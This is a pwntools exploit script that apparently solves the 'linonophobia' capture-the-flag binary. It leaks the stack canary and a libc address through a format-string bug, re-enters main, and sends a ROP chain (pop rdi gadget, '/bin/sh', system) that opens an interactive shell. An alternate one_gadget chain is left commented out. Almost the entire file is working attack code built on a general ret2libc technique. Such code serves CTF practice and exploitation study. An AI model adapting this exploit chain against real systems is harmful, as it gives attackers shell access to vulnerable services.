from pwn import *
import re

HOST, PORT = "chal.imaginaryctf.org", 42006
BINARY = './linonophobia'
# context.log_level = 'critical'

libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')

def start():
    if not args.REMOTE:
        log.info("LOCAL PROCESS")
        return process(BINARY)
    else:
        log.info("REMOTE PROCESS")
        return remote(HOST, PORT)

def solve():

    p = start()

    # gdb.attach(p, '''
    # b *main+0x64
    # b *main+0x135
    # b *main+0x149
    # ''')

    # Leak stack canary
    # 260 to overwrite first byte of canary value with \n, which is always 00
    # For some reason, traditional %x %x %x or %10$p doesn't seem to work, so
    # we resort to pushing the argument right before the value we want to read
    fmt_str_payload = b'a' * 260 
    fmt_str_payload += b'%1$p'

    p.sendlineafter(b'sErVeR!', fmt_str_payload)
    p.recvline()
    p.recvline()

    # Process this leak
    if args.REMOTE:
        leak = p.recvline()[:-1] # Remove extra \n in recv input (remote only)
    else:
        leak = p.recvline()[:-4] # Somehow this works locally...
    rev = '00'

    for b in leak:
        b = hex(b)[2:].zfill(2)
        rev = b + rev

    canary = p64(int(rev, 16))
    log.info('Canary value: ' + hex(int(rev, 16)))
    
    # Payload to return to this function again
    payload = b'a' * 264
    payload += canary
    payload += p64(0x400810) # Old EBP
    payload += p64(0x4006b7) # Start of main function
    
    p.sendline(payload)

    #################################################################################

    # Attempt to leak libc function now
    libc_leak_payload = b'a' * (260 + 39) 
    # Use 23 for remote, 39 for local, found through trial and error :(
    # Presumably, this is the next value up the stack call frame, since we corrupted the first one (__libc_start_main) to return to the main function again

    libc_leak_payload += b'%1$p'

    p.sendlineafter(b'sErVeR!', libc_leak_payload)
    p.recvline()
    p.recvline()

    leak = p.recvline()[:-1]
    rev = ''

    for b in leak:
        b = hex(b)[2:].zfill(2)
        rev = b + rev

    # From init_cache info we can find the address of __libc_start_main
    # and then use that to find the base address of libc
    # 0x421 = value found manually from GDB, subtracting init_cache_info from libc_start_main
    # 234 = address of libc_start_main rip is at
    libc_base = int(rev, 16) + 0x421 - libc.symbols['__libc_start_main'] - 234
    log.info("libc_base: " + hex(libc_base))

    SYSTEM = libc.sym["system"] + libc_base
    BINSH = ((next(libc.search(b"/bin/sh")))) + libc_base

    final_payload = b'a' * (264)
    final_payload += canary
    final_payload += p64(0x400810) # old RBP as padding
    
    # 0x0000000000400873 : pop rdi ; ret
    final_payload += p64(0x400566)
    final_payload += p64(0x400873) # Gadget address
    final_payload += p64(BINSH) # Set rdi to /bin/sh
    final_payload += p64(SYSTEM) # Syscall system

    # Alternate way to use gadgets. one_gadget requires r12 to be 0, so we make use of gadgets to set r12 and r13 = 0
    # Use gadgets to set r12 = 0, r13 = 0
    # 0x000000000040086c : pop rbp; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    # final_payload += p64(0x40086b) # our gadget
    # final_payload += p64(0x40120a) # rbp
    # final_payload += p64(0) # r12
    # final_payload += p64(0) # r13
    # final_payload += p64(0) # r14
    # final_payload += p64(0) # r15
    # final_payload += p64(libc_base + 0xcbd1a) # Use onegadget tool to find this value

    p.sendline(final_payload)

    p.interactive()

solve()